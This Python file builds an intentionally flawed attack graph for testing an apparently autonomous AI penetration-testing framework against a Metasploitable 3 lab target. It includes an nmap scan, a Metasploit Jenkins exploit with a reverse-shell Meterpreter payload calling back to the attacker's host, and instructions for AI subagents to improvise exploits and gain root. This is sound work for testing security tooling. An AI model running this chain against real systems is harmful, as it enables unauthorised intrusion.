"""
Example Attack Graph: DELIBERATELY FLAWED at INITIAL ACCESS (Metasploitable 3)

This graph is wrong on purpose, narrowly at the INITIAL-ACCESS stage, to
exercise the direct->subagent FALLBACK:

  THE FLAW (gain_access): the plan prescribes the WRONG exploit module --
    exploit/multi/http/jenkins_script_console against RPORT 8484. Jenkins is
    NOT running on this target and 8484 is closed, so DIRECT execution of the
    prescribed module fails fast. In explore mode this hands the node off to
    the exploit STAGE SUBAGENT, which must improvise a real, working initial-
    access vector against the services discovered by recon (rather than the
    bogus Jenkins-on-8484 vector baked into the plan).

Everything else is a normal, well-formed chain so the only thing under test is
the initial-access fallback:

  recon       — nmap service scan (concrete command)
  gain_access — WRONG metasploit module (the injected flaw -> fallback)
  escalate    — GOAL-ONLY privesc (no module, no commands) -> stage subagent
  file_drop   — session-tool impact: write + read /tmp/pwned_flaw_ia.txt

Expected adaptation: direct exec of the Jenkins module fails -> exploit
subagent finds a genuine vector and opens a session -> escalate and file_drop
proceed on that session. Run with explore=True so the fallback is active.
"""

from core_agents.attack_graph import (
    AttackGraph, AttackNode, AttackEdge, EdgeCheck,
    EdgeCondition, Tactic,
)


def build_flaw_initial_access_graph(target_ip: str, attacker_ip: str) -> AttackGraph:

    graph = AttackGraph.create(
        objective="Compromise the Metasploitable 3 target, escalate to root, and "
                  "drop a verified proof-of-compromise file. (This plan is "
                  "intentionally flawed at initial access: the prescribed exploit "
                  "module is wrong -- Jenkins on 8484 is not running -- so direct "
                  "execution fails and the exploit subagent must improvise a real "
                  "vector against the discovered services.)",
        target_ip=target_ip,
        name=f"flaw_initial_access_{target_ip}",
        attacker_ip=attacker_ip,
        scope=[target_ip],
        description="Intentionally-flawed initial-access chain to test direct->subagent fallback.",
        metadata={"scenario": "flaw_initial_access", "target_type": "metasploitable3"},
    )

    # =========================================================================
    # NODES
    # =========================================================================

    graph.add_node(AttackNode(
        id="recon",
        label="Discover Attack Surface",
        tactic=Tactic.RECONNAISSANCE.value,
        technique_id="T1046",
        technique_name="Network Service Discovery",
        agent_type="recon",
        goal="Map the target's open services and versions",
        objective=f"Discover open ports, services and versions on {target_ip}.",
        target_ip=target_ip,
        tool_name="nmap",
        commands_to_run=[f"nmap -Pn -sV --top-ports 1000 -T4 {target_ip}"],
        max_retries=2,
        tags=["recon"],
    ))

    # FLAW: wrong module -- Jenkins on 8484 is NOT running / port closed.
    # Direct exec fails -> exploit stage subagent must improvise a real vector.
    graph.add_node(AttackNode(
        id="gain_access",
        label="Gain Initial Access (WRONG module on purpose)",
        tactic=Tactic.INITIAL_ACCESS.value,
        technique_id="T1190",
        technique_name="Exploit Public-Facing Application",
        agent_type="exploit",
        goal="Open a session on the target",
        objective=f"Gain an initial session on {target_ip}. (The prescribed module "
                  f"is wrong -- Jenkins on 8484 is not running. If it fails, find a "
                  f"vector that actually works against the discovered services. "
                  f"LHOST={attacker_ip}.)",
        target_ip=target_ip,
        tool_name="metasploit",
        module="exploit/multi/http/jenkins_script_console",
        module_options={"RHOSTS": target_ip, "RPORT": 8484, "TARGETURI": "/"},
        payload="java/meterpreter/reverse_tcp",
        payload_options={"LHOST": attacker_ip, "LPORT": 4462},
        max_retries=4,
        tags=["initial_access", "flaw_wrong_module"],
    ))

    # GOAL-ONLY privesc: no module, no commands -> dispatches to stage subagent.
    graph.add_node(AttackNode(
        id="escalate",
        label="Escalate Privileges to Root",
        tactic=Tactic.PRIVILEGE_ESCALATION.value,
        technique_id="T1068",
        technique_name="Exploitation for Privilege Escalation",
        agent_type="privesc",
        goal="Escalate the compromised session to root",
        objective="From the existing session, enumerate AND exploit any viable "
                  "privilege-escalation vector (sudo, SUID, kernel exploit, cron, "
                  "capabilities, writable config, docker group) to obtain a root "
                  "shell. Verify success with id/whoami showing uid=0.",
        target_ip=target_ip,
        max_retries=1,
        tags=["privesc", "escalation", "goal_only"],
    ))

    graph.add_node(AttackNode(
        id="file_drop",
        label="Drop Proof-of-Compromise File",
        tactic=Tactic.IMPACT.value,
        technique_id="T1485",
        technique_name="Data Destruction",
        agent_type="impact",
        goal="Demonstrate compromise with a written-and-verified artifact",
        objective="Write a proof-of-compromise file to /tmp/pwned_flaw_ia.txt via "
                  "the session, then read it back to verify the write succeeded.",
        target_ip=target_ip,
        tool_name="session",
        commands_to_run=[
            "echo '{marker}' > {target_file}",
            "echo \"Compromised at $(date)\" >> {target_file}",
            "echo \"User: $(whoami)\" >> {target_file}",
            "cat {target_file}",
        ],
        command_params={
            "target_file": "/tmp/pwned_flaw_ia.txt",
            "marker": "PWNED via initial-access fallback",
        },
        max_retries=3,
        metadata={"target_file": "/tmp/pwned_flaw_ia.txt"},
        tags=["impact", "file_drop", "proof"],
    ))

    # =========================================================================
    # EDGES
    # =========================================================================

    graph.connect(
        "recon", "gain_access",
        checks=[
            EdgeCheck(
                field="success", operator="equals", expected="True",
                description="recon produced usable data",
            ),
        ],
        evidence="Recon mapped the attack surface",
        rationale="Attempt initial access against discovered services",
    )

    graph.connect(
        "gain_access", "escalate",
        checks=[
            EdgeCheck(
                field="session_id", operator="exists",
                description="session opened",
            ),
        ],
        evidence="Initial session established",
        rationale="Escalate privileges from the new session",
    )

    graph.connect(
        "escalate", "file_drop",
        checks=[
            EdgeCheck(
                field="session_id", operator="exists",
                description="session available for impact",
            ),
        ],
        evidence="Session available after escalation step",
        rationale="Drop the proof-of-compromise file as the impact step",
    )

    return graph


# =============================================================================
# CLI
# =============================================================================

if __name__ == "__main__":
    graph = build_flaw_initial_access_graph(
        target_ip="192.168.34.7",
        attacker_ip="192.168.34.6",
    )
    print(graph.summary())
    print()

    out_path = "examples/flaw_initial_access_graph.json"
    graph.save(out_path)
    print(f"Saved to {out_path}")

    loaded = AttackGraph.load(out_path)
    print(f"\nReloaded: {loaded}")
    print(f"Ready nodes: {loaded.ready_nodes()}")
